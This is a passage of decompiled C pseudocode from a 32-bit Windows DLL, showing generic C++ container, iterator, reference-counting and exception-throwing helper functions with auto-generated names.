  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10007650(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10007CE3(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000716A) --------------------------------------------------------
void *__thiscall sub_1000716A(_DWORD *this)
{
  void *result; // eax

  result = &loc_100786A1;
  *this = &off_10093304;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10093304: using guessed type int (__thiscall *off_10093304)(void *Block, char);

//----- (10007194) --------------------------------------------------------
int *__thiscall sub_10007194(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1000746F(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100071EC: variable 'v5' is possibly undefined

//----- (10007207) --------------------------------------------------------
int *__thiscall sub_10007207(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100074AF(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000725F: variable 'v5' is possibly undefined

//----- (1000727A) --------------------------------------------------------
void __thiscall sub_1000727A(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10007C90(v2);
}

//----- (100072B8) --------------------------------------------------------
void __thiscall sub_100072B8(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10007C90(v3);
}

//----- (100072F9) --------------------------------------------------------
void __thiscall sub_100072F9(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10007C90(v2);
}

//----- (10007337) --------------------------------------------------------
int __thiscall sub_10007337(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10007D27(v4);
  return v2;
}

//----- (1000737B) --------------------------------------------------------
int __thiscall sub_1000737B(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10007C90(v4);
  return v2;
}

//----- (100073BF) --------------------------------------------------------
void __thiscall sub_100073BF(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10007C90(v1);
}

//----- (10007414) --------------------------------------------------------
_DWORD *__thiscall sub_10007414(_DWORD *Block, char a2)
{
  sub_1000716A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000746F) --------------------------------------------------------
int __usercall sub_1000746F@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100074AF) --------------------------------------------------------
int __usercall sub_100074AF@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100074E0) --------------------------------------------------------
_DWORD *__thiscall sub_100074E0(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1009333C;
  a2[1] = this;
  *a2 = &off_1009337C;
  a2[2] = a3;
  return result;
}
// 1009333C: using guessed type int (__thiscall *off_1009333C)(void *Block, char);
// 1009337C: using guessed type int (__thiscall *off_1009337C)(void *Block, char);

//----- (10007518) --------------------------------------------------------
void *__thiscall sub_10007518(_DWORD *this)
{
  void *result; // eax

  result = &loc_10078611;
  *this = &off_1009337C;
  *this = &off_1009333C;
  return result;
}
// 1009333C: using guessed type int (__thiscall *off_1009333C)(void *Block, char);
// 1009337C: using guessed type int (__thiscall *off_1009337C)(void *Block, char);

//----- (10007542) --------------------------------------------------------
bool __thiscall sub_10007542(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10007559) --------------------------------------------------------
BOOL __thiscall sub_10007559(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10007563) --------------------------------------------------------
int __thiscall sub_10007563(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1000759E) --------------------------------------------------------
int __thiscall sub_1000759E(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (100075D4) --------------------------------------------------------
int __thiscall sub_100075D4(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (100075FC) --------------------------------------------------------
int __thiscall sub_100075FC(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10007637) --------------------------------------------------------
int __thiscall sub_10007637(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10007650) --------------------------------------------------------
_DWORD *__thiscall sub_10007650(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1009335C;
  a2[1] = this;
  *a2 = &off_1009339C;
  a2[2] = a3;
  return result;
}
// 1009335C: using guessed type int (__thiscall *off_1009335C)(void *Block, char);
// 1009339C: using guessed type int (__thiscall *off_1009339C)(void *Block, char);

//----- (10007688) --------------------------------------------------------
void *__thiscall sub_10007688(_DWORD *this)
{
  void *result; // eax

  result = &loc_100785ED;
  *this = &off_1009339C;
  *this = &off_1009335C;
  return result;
}
// 1009335C: using guessed type int (__thiscall *off_1009335C)(void *Block, char);
// 1009339C: using guessed type int (__thiscall *off_1009339C)(void *Block, char);

//----- (100076B2) --------------------------------------------------------
bool __thiscall sub_100076B2(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100076C9) --------------------------------------------------------
BOOL __thiscall sub_100076C9(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100076D3) --------------------------------------------------------
int __thiscall sub_100076D3(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1000770E) --------------------------------------------------------
int __thiscall sub_1000770E(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10007744) --------------------------------------------------------
int __thiscall sub_10007744(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1000776C) --------------------------------------------------------
int __thiscall sub_1000776C(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (100077A7) --------------------------------------------------------
int __thiscall sub_100077A7(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (100077C0) --------------------------------------------------------
_DWORD *__thiscall sub_100077C0(_DWORD *Block, char a2)
{
  sub_10007518(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100077DC) --------------------------------------------------------
_DWORD *__thiscall sub_100077DC(_DWORD *Block, char a2)
{
  sub_10007688(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007816) --------------------------------------------------------
_DWORD *__stdcall sub_10007816(_DWORD *a1)
{
  sub_10007D82(a1);
  *a1 = &off_100932A8;
  sub_10007DB1(16, a1);
  return a1;
}
// 100932A8: using guessed type int (__thiscall *off_100932A8)(void *Block, char);

//----- (10007851) --------------------------------------------------------
void **__thiscall sub_10007851(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (10007890) --------------------------------------------------------
void *__thiscall sub_10007890(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_100932A8;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_1000716A((_DWORD *)this);
}
// 100932A8: using guessed type int (__thiscall *off_100932A8)(void *Block, char);

//----- (100078EE) --------------------------------------------------------
int __thiscall sub_100078EE(_DWORD *this)
{
  return this[1];
}

//----- (100078F2) --------------------------------------------------------
int __thiscall sub_100078F2(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B7DE6);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (1000794D) --------------------------------------------------------
int __thiscall sub_1000794D(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10007965) --------------------------------------------------------
int __thiscall sub_10007965(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B7DE7);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (100079AE) --------------------------------------------------------
int __thiscall sub_100079AE(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B7DEA);
  return this[3] + 4 * a2;
}

//----- (100079CC) --------------------------------------------------------
int __thiscall sub_100079CC(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B7DEB);
  return this[3] + 4 * a2;
}

//----- (100079EA) --------------------------------------------------------
void __thiscall sub_100079EA(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (10007A0C) --------------------------------------------------------
int __thiscall sub_10007A0C(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10007A30) --------------------------------------------------------
BOOL __thiscall sub_10007A30(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10007A3B) --------------------------------------------------------
int __thiscall sub_10007A3B(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (10007A7A) --------------------------------------------------------
unsigned int __thiscall sub_10007A7A(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B7DEE);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10007AEC) --------------------------------------------------------
unsigned int __thiscall sub_10007AEC(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10007B14) --------------------------------------------------------
unsigned int __stdcall sub_10007B14(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10007B25) --------------------------------------------------------
unsigned int __thiscall sub_10007B25(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10007B82) --------------------------------------------------------
void __thiscall sub_10007B82(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10007C4C) --------------------------------------------------------
_DWORD *__userpurge sub_10007C4C@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10007C90) --------------------------------------------------------
void __thiscall sub_10007C90(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10007DE3((int)this);
}

//----- (10007CE3) --------------------------------------------------------
_DWORD *__userpurge sub_10007CE3@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10007D27) --------------------------------------------------------
void __thiscall sub_10007D27(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10007E1D((int)this);
}

//----- (10007D66) --------------------------------------------------------
void *__thiscall sub_10007D66(void *Block, char a2)
{
  sub_10007890((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007D82) --------------------------------------------------------
_DWORD *__stdcall sub_10007D82(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10093304;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10093304: using guessed type int (__thiscall *off_10093304)(void *Block, char);

//----- (10007DB1) --------------------------------------------------------
void *__usercall sub_10007DB1@<eax>(int a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(4 * a1);
  a2[3] = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10007DE3) --------------------------------------------------------
void __usercall sub_10007DE3(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10007E1D) --------------------------------------------------------
void __usercall sub_10007E1D(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10007E5A) --------------------------------------------------------
_DWORD *__stdcall sub_10007E5A(_DWORD *a1, int a2, int a3, int a4, int a5)
{
  sub_100148B1(a1);
  *a1 = &off_100933BC;
  sub_100141F3(a1 + 1, (int)&a2);
  a1[4] = a5;
  sub_100141CF(&a2);
  return a1;
}
// 100933BC: using guessed type int (__thiscall *off_100933BC)(void *Block, char);

//----- (10007EB0) --------------------------------------------------------
int *__thiscall sub_10007EB0(int *Block, char a2)
{
  sub_10007ECC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007ECC) --------------------------------------------------------
void __thiscall sub_10007ECC(int *this)
{
  *this = (int)&off_100933BC;
  sub_100141CF(this + 1);
  sub_100148FB(this);
}
// 100933BC: using guessed type int (__thiscall *off_100933BC)(void *Block, char);

//----- (10007F07) --------------------------------------------------------
int sub_10007F07()
{
  return 43;
}

//----- (10007F0B) --------------------------------------------------------
void *__thiscall sub_10007F0B(DWORD *this, _DWORD *a2)
{
  void (__thiscall **v3)(_DWORD *, int, int, int, int, int); // eax
  void (__thiscall **v4)(_DWORD *, int, int, int, int, int); // eax
  int v6; // [esp-14h] [ebp-29Ch] BYREF
  int v7; // [esp-10h] [ebp-298h]
  int v8; // [esp-Ch] [ebp-294h]
  int v9; // [esp-8h] [ebp-290h]
  int v10; // [esp-4h] [ebp-28Ch]
  int v11; // [esp+0h] [ebp-288h] BYREF
  int v12[129]; // [esp+Ch] [ebp-27Ch] BYREF
  int v13[9]; // [esp+210h] [ebp-78h] BYREF
  _DWORD v14[5]; // [esp+234h] [ebp-54h] BYREF
  int v15[8]; // [esp+248h] [ebp-40h] BYREF
  DWORD v16[3]; // [esp+268h] [ebp-20h] BYREF
  int *v17; // [esp+274h] [ebp-14h]
  int *v18; // [esp+278h] [ebp-10h]
  int v19; // [esp+284h] [ebp-4h]

  v18 = &v11;
  v16[2] = (DWORD)this;
  v12[0] = (int)&off_100932A0;
  memset(&v12[1], 0, 0x200u);
  v19 = 0;
  sub_10008064(v14);
  LOBYTE(v19) = 1;
  sub_1001C74E(v16, this[4]);
  if ( !sub_1001C786(v16) )
  {
    sub_100081CE(v15);
    LOBYTE(v19) = 2;
    if ( sub_10006B51((__int16 *)v12, (int)v15) == 1 )
    {
      v17 = &v6;
      sub_10008344(v15, (int)&v6);
      LOBYTE(v19) = 3;
      v3 = (void (__thiscall **)(_DWORD *, int, int, int, int, int))(*a2 + 76);
      LOBYTE(v19) = 2;
      (*v3)(a2, v6, v7, v8, v9, v10);
      sub_10017D60(v13);
      LOBYTE(v19) = 4;
      sub_10014B37(v14, (int)v13);
      v17 = &v6;
      sub_10017EAF(v13, (int)&v6);
      LOBYTE(v19) = 5;
      v4 = (void (__thiscall **)(_DWORD *, int, int, int, int, int))(*a2 + 76);
      LOBYTE(v19) = 4;
      (*v4)(a2, v6, v7, v8, v9, v10);
      LOBYTE(v19) = 2;
      sub_10017DC3((int)v13);
    }
    LOBYTE(v19) = 6;
    sub_10014E23((int)(this + 1), 30, 0);
    LOBYTE(v19) = 1;
    sub_10008234(v15);
    LOBYTE(v19) = 1;
  }
  LOBYTE(v19) = 0;
  return sub_100081A5(v14);
}
// 100932A0: using guessed type int (__thiscall *off_100932A0)(void *Block, char);
// 10007F0B: using guessed type _DWORD var_54[5];
// 10007F0B: using guessed type int var_40[8];
// 10007F0B: using guessed type int var_78[9];

//----- (10008064) --------------------------------------------------------
_DWORD *__stdcall sub_10008064(_DWORD *a1)
{
  _DWORD *v1; // eax
  size_t v2; // ecx
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  size_t v5; // ecx
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  size_t v8; // ecx
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  size_t v11; // ecx
  _DWORD *v12; // eax
  size_t v14; // [esp-8h] [ebp-24h] BYREF
